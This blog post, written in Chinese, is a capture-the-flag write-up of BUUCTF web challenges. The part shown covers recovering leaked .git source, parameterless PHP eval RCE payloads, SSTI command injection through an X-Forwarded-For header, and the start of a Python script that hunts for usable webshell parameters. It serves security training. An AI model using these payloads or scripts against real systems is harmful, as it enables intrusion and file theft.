<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>BUU_WEB刷题_0x20-0x2F - Ghostasky&#39;s Blog</title><meta name="author" content="">
<meta name="author-link" content="">
<meta name="description" content="" /><meta name="keywords" content='WEB' /><meta itemprop="name" content="BUU_WEB刷题_0x20-0x2F">
<meta itemprop="description" content=""><meta itemprop="datePublished" content="2021-09-12T00:00:00+00:00" />
<meta itemprop="dateModified" content="2021-09-12T00:00:00+00:00" />
<meta itemprop="wordCount" content="7714">
<meta itemprop="keywords" content="WEB," /><meta property="og:title" content="BUU_WEB刷题_0x20-0x2F" />
<meta property="og:description" content="" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/posts/buu-web-0x20-0x2f/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-09-12T00:00:00+00:00" />
<meta property="article:modified_time" content="2021-09-12T00:00:00+00:00" />
<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="BUU_WEB刷题_0x20-0x2F"/>
<meta name="twitter:description" content=""/>
<meta name="application-name" content="FixIt">
<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://localhost:1313/posts/buu-web-0x20-0x2f/" /><link rel="prev" href="http://localhost:1313/posts/tcache_stashing_unlink_atack%E8%B0%83%E8%AF%95/" /><link rel="next" href="http://localhost:1313/posts/buu-web-0x30-0x3f/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "BUU_WEB刷题_0x20-0x2F",
    "inLanguage": "zh-CN",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/posts\/buu-web-0x20-0x2f\/"
    },"genre": "posts","keywords": "WEB","wordcount":  7714 ,
    "url": "http:\/\/localhost:1313\/posts\/buu-web-0x20-0x2f\/","datePublished": "2021-09-12T00:00:00+00:00","dateModified": "2021-09-12T00:00:00+00:00","publisher": {
      "@type": "Organization",
      "name": ""},"author": {
        "@type": "Person",
        "name": "作者"
      },"description": ""
  }
  </script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              >文章</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              >分类</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              >标签</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              >关于</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="切换主题">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="/images/fixit.png" data-title="/images/fixit.png" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/posts/"
                  
                  
                >文章</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                >分类</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                >标签</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                >关于</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>BUU_WEB刷题_0x20-0x2F</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
      Anonymous</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/technology/" class="post-category" title="分类 - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Technology</a></span></div><div class="post-meta-line"><span title="发布于 2021-09-12 00:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2021-09-12">2021-09-12</time></span>&nbsp;<span title="7714 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 7800 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 16 分钟</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>目录</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#0x20gxyctf2019禁止套娃">0x20.[GXYCTF2019]禁止套娃</a></li>
    <li><a href="#0x21bjdctf2020the-mystery-of-ip">0x21.[BJDCTF2020]The mystery of ip</a></li>
    <li><a href="#0x22强网杯-2019高明的黑客">0x22.[强网杯 2019]高明的黑客</a></li>
    <li><a href="#0x23gwctf-2019我有一个数据库">0x23.[GWCTF 2019]我有一个数据库</a></li>
    <li><a href="#0x24bjdctf2020zjctf不过如此">0x24.[BJDCTF2020]ZJCTF，不过如此</a></li>
    <li><a href="#0x25bjdctf2020mark-loves-cat">0x25.[BJDCTF2020]Mark loves cat</a></li>
    <li><a href="#0x26网鼎杯-2020-朱雀组phpweb">0x26.[网鼎杯 2020 朱雀组]phpweb</a></li>
    <li><a href="#0x27安洵杯-2019easy_web">0x27.[安洵杯 2019]easy_web</a></li>
    <li><a href="#0x28bsidescf-2020had-a-bad-day">0x28.[BSidesCF 2020]Had a bad day</a></li>
    <li><a href="#0x29nctf2019fake-xml-cookbook">0x29.[NCTF2019]Fake XML cookbook</a></li>
    <li><a href="#0x2abjdctf2020cookie-is-so-stable">0x2A.[BJDCTF2020]Cookie is so stable</a></li>
    <li><a href="#0x2basis-2019unicorn-shop">0x2B.[ASIS 2019]Unicorn shop</a></li>
    <li><a href="#0x2c安洵杯-2019easy_serialize_php">0x2C.[安洵杯 2019]easy_serialize_php</a></li>
    <li><a href="#0x2d极客大挑战-2019php">0x2D.[极客大挑战 2019]PHP</a></li>
    <li><a href="#0x2ede1ctf-2019ssrf-me">0x2E.[De1CTF 2019]SSRF Me</a></li>
    <li><a href="#0x2fciscn-2019-初赛love-math">0x2F.[CISCN 2019 初赛]Love Math</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><p>[toc]</p>
<h2 id="0x20gxyctf2019禁止套娃" class="heading-element">
  <a href="#0x20gxyctf2019%e7%a6%81%e6%ad%a2%e5%a5%97%e5%a8%83" class="heading-mark"></a>0x20.[GXYCTF2019]禁止套娃</h2><blockquote>
<p>考点是无参数RCE先贴两个链接：</p>
<p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE"target="_blank" rel="external nofollow noopener noreferrer">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE</a></p>
<p><a href="http://www.heetian.com/info/827"target="_blank" rel="external nofollow noopener noreferrer">http://www.heetian.com/info/827</a></p>
</blockquote>
<p>找了半天没发现啥，看wp说是git泄露，然后</p>
<div class="highlight" id="id-1"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/GitHack<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ python GitHack.py  http://25ced3f5-75c8-4ac6-9d2c-9097371101ca.node4.buuoj.cn:81/
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Download and parse index file ...
</span></span><span class="line"><span class="cl">error: Not a Git index file
</span></span><span class="line"><span class="cl">                                                                                                                                              
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/GitHack<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ python GitHack.py  http://25ced3f5-75c8-4ac6-9d2c-9097371101ca.node4.buuoj.cn:81/.git                                                 <span class="m">1</span> ⨯
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Download and parse index file ...
</span></span><span class="line"><span class="cl">index.php
</span></span><span class="line"><span class="cl"><span class="o">[</span>OK<span class="o">]</span> index.php
</span></span><span class="line"><span class="cl">                                                                                                                                              
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/GitHack<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ python GitHack.py  http://25ced3f5-75c8-4ac6-9d2c-9097371101ca.node4.buuoj.cn:81/.gitls
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Download and parse index file ...
</span></span><span class="line"><span class="cl">error: Not a Git index file
</span></span><span class="line"><span class="cl">                                                                                                                                              
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/GitHack<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ ls                                                                                                                                    <span class="m">1</span> ⨯
</span></span><span class="line"><span class="cl">25ced3f5-75c8-4ac6-9d2c-9097371101ca.node4.buuoj.cn_81  GitHack.py  index  lib  README.md
</span></span><span class="line"><span class="cl">                                                                                                                                              
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/GitHack<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ <span class="nb">cd</span> 25ced3f5-75c8-4ac6-9d2c-9097371101ca.node4.buuoj.cn_81 
</span></span><span class="line"><span class="cl">                                                                                                                                              
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/GitHack/25ced3f5-75c8-4ac6-9d2c-9097371101ca.node4.buuoj.cn_81<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ ls
</span></span><span class="line"><span class="cl">index.php
</span></span><span class="line"><span class="cl">                                                                                                                                              
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/GitHack/25ced3f5-75c8-4ac6-9d2c-9097371101ca.node4.buuoj.cn_81<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ cat index.php                                            
</span></span><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">include <span class="s2">&#34;flag.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;flag在哪里呢？&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;exp&#39;</span><span class="o">])){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span>!preg_match<span class="o">(</span><span class="s1">&#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#39;</span>, <span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;exp&#39;</span><span class="o">]))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="o">(</span><span class="s1">&#39;;&#39;</span> <span class="o">===</span> preg_replace<span class="o">(</span><span class="s1">&#39;/[a-z,_]+\((?R)?\)/&#39;</span>, NULL, <span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;exp&#39;</span><span class="o">]))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span>!preg_match<span class="o">(</span><span class="s1">&#39;/et|na|info|dec|bin|hex|oct|pi|log/i&#39;</span>, <span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;exp&#39;</span><span class="o">]))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                // <span class="nb">echo</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;exp&#39;</span><span class="o">]</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                @eval<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;exp&#39;</span><span class="o">])</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="o">{</span>
</span></span><span class="line"><span class="cl">                die<span class="o">(</span><span class="s2">&#34;还差一点哦！&#34;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="o">{</span>
</span></span><span class="line"><span class="cl">            die<span class="o">(</span><span class="s2">&#34;再好好想想！&#34;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="o">{</span>
</span></span><span class="line"><span class="cl">        die<span class="o">(</span><span class="s2">&#34;还想读flag，臭弟弟！&#34;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">// highlight_file<span class="o">(</span>__FILE__<span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">?&gt;</span></span></code></pre></div><p>首先一些php的伪协议不能够使用，第二层(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数，第三层过滤了一些函数</p>
<p>说下第二层：</p>
<div class="highlight" id="id-2"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="s1">&#39;;&#39;</span> <span class="o">===</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[a-z,_]+\((?R)?\)/&#39;</span><span class="p">,</span> <span class="k">NULL</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;exp&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="c1">// echo $_GET[&#39;exp&#39;];
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;exp&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>会发现使用参数就无法通过正则，(?R)?这个意思为递归整个匹配模式,所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数），将匹配的替换为空，判断剩下的是否只有;.举个例子：a(b(c()));可以使用，但是a(‘b’)或者a(‘b’,’c’)这种含有参数的都不能使用,所以我们要使用无参数的函数进行文件读取或者命令执行.</p>
<p>构造<code>exp=print_r(phpversion());</code>发现可以执行</p>
<p>首先要知道都有什么文件，使用print_r(scandir(&rsquo;.&rsquo;));，会出问题，因为有参数.</p>
<p>下面就要找一个来代替scandir(&rsquo;.&rsquo;)，</p>
<p>要用到的函数：</p>
<ol>
<li>localeconv():localeconv()返回一包含本地数字及货币格式信息的数组。这个数组的第一项就是我们需要的”.”</li>
<li>current():current()返回数组中的单元,默认取第一个值,在本题中我们只需要使用localeconv(current())便可以构造出我们一直念念不忘的”.”</li>
<li>array_reverse():将输入的数组反向排序输出,在本题中将index.php作为数组的第一个元素,flag.php作为数组的第二个元素.</li>
<li>next():将当前数组的光标向后移一位,在本题中即将光标从index.php转向后面一项的flag.php</li>
</ol>
<p>可以构造payload：<code>exp=print_r(scandir(current(localeconv())));</code></p>
<p><img loading="lazy" src="/posts/buu-web-0x20-0x2f/image-20210912111645049.png" alt="image-20210912111645049" srcset="/posts/buu-web-0x20-0x2f/image-20210912111645049.png?size=small, /posts/buu-web-0x20-0x2f/image-20210912111645049.png?size=medium 1.5x, /posts/buu-web-0x20-0x2f/image-20210912111645049.png?size=large 2x" data-title="image-20210912111645049" style="--width: 1014px;--aspect-ratio: 1014 / 317;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>然后继续构造：<code>exp=print_r(next(array_reverse(scandir(current(localeconv())))));</code></p>
<p>发现已经是flag.php了然后可以用以下任意函数来包含：</p>
<pre tabindex="0"><code>how_source(end(scandir(getcwd())));
readfile
highlight_file
file_get_contents </code></pre><p>最终payload：<code>exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</code></p>
<h2 id="0x21bjdctf2020the-mystery-of-ip" class="heading-element">
  <a href="#0x21bjdctf2020the-mystery-of-ip" class="heading-mark"></a>0x21.[BJDCTF2020]The mystery of ip</h2><blockquote>
<p>考点是SSTI模板注入，但是这个比较简单，这里贴个图：</p>
<p><img loading="lazy" src="/posts/buu-web-0x20-0x2f/image-20210912114416606.png" alt="image-20210912114416606" srcset="/posts/buu-web-0x20-0x2f/image-20210912114416606.png?size=small, /posts/buu-web-0x20-0x2f/image-20210912114416606.png?size=medium 1.5x, /posts/buu-web-0x20-0x2f/image-20210912114416606.png?size=large 2x" data-title="image-20210912114416606" style="--width: 1035px;--aspect-ratio: 1035 / 609;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
</blockquote>
<p>这题环境开的时候以为环境出问题了，加了index.php后发现没问题</p>
<p>看了看没啥头绪，然后wp：</p>
<p>和ip有关，尝试xff或者client-ip，123或者{7*8}，都可以控制</p>
<p>然后``{system(&ldquo;cd ../../../;ls&rdquo;)}`发现flag</p>
<p>{system(&ldquo;cd ../../../;cat flag&rdquo;)}</p>
<h2 id="0x22强网杯-2019高明的黑客" class="heading-element">
  <a href="#0x22%e5%bc%ba%e7%bd%91%e6%9d%af-2019%e9%ab%98%e6%98%8e%e7%9a%84%e9%bb%91%e5%ae%a2" class="heading-mark"></a>0x22.[强网杯 2019]高明的黑客</h2><p>解压下来3k多个文件。。</p>
<p>考点其实就是代码的编写，不会，找的网上的一些。</p>
<div class="highlight" id="id-4"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">concurrent.futures.thread</span> <span class="kn">import</span> <span class="n">ThreadPoolExecutor</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">path</span> <span class="o">=</span> <span class="s2">&#34;D://phpStudy//PHPTutorial//WWW//src//&#34;</span>  <span class="c1"># 文件夹目录</span>
</span></span><span class="line"><span class="cl"><span class="n">files</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>  <span class="c1"># 得到文件夹下的所有文件名称</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">mutex</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Lock</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">pool</span> <span class="o">=</span> <span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="n">max_workers</span><span class="o">=</span><span class="mi">50</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_file</span><span class="p">(</span><span class="n">file</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span> <span class="o">+</span> <span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="n">file</span><span class="p">);</span>  <span class="c1"># 打开文件</span>
</span></span><span class="line"><span class="cl">    <span class="n">iter_f</span> <span class="o">=</span> <span class="nb">iter</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>  <span class="c1"># 创建迭代器</span>
</span></span><span class="line"><span class="cl">    <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">iter_f</span><span class="p">:</span>  <span class="c1"># 遍历文件，一行行遍历，读取文本</span>
</span></span><span class="line"><span class="cl">        <span class="nb">str</span> <span class="o">=</span> <span class="nb">str</span> <span class="o">+</span> <span class="n">line</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="c1"># 获取一个页面内所有参数</span>
</span></span><span class="line"><span class="cl">    <span class="n">start</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">params</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="nb">str</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;$_GET[&#39;&#34;</span><span class="p">,</span> <span class="n">start</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">pos2</span> <span class="o">=</span> <span class="nb">str</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;&#39;]&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;$_GET[&#39;&#34;</span><span class="p">,</span> <span class="n">start</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">var</span> <span class="o">=</span> <span class="nb">str</span><span class="p">[</span><span class="nb">str</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;$_GET[&#39;&#34;</span><span class="p">,</span> <span class="n">start</span><span class="p">)</span> <span class="o">+</span> <span class="mi">7</span><span class="p">:</span> <span class="n">pos2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">start</span> <span class="o">=</span> <span class="n">pos2</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">        <span class="n">params</span><span class="p">[</span><span class="n">var</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;echo(&#34;glzjin&#34;);&#39;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">        <span class="c1"># print(var)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="n">start</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="nb">str</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;$_POST[&#39;&#34;</span><span class="p">,</span> <span class="n">start</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">pos2</span> <span class="o">=</span> <span class="nb">str</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;&#39;]&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;$_POST[&#39;&#34;</span><span class="p">,</span> <span class="n">start</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">var</span> <span class="o">=</span> <span class="nb">str</span><span class="p">[</span><span class="nb">str</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;$_POST[&#39;&#34;</span><span class="p">,</span> <span class="n">start</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8</span><span class="p">:</span> <span class="n">pos2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">start</span> <span class="o">=</span> <span class="n">pos2</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="p">[</span><span class="n">var</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;echo(&#34;glzjin&#34;);&#39;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">        <span class="c1"># print(var)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="c1"># eval test</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://127.0.0.1/src/&#39;</span> <span class="o">+</span> <span class="n">file</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;glzjin&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">mutex</span><span class="o">.</span><span class="n">acquire</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">file</span> <span class="o">+</span> <span class="s2">&#34; found!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">mutex</span><span class="o">.</span><span class="n">release</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="c1"># assert test</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">params</span><span class="p">:</span>
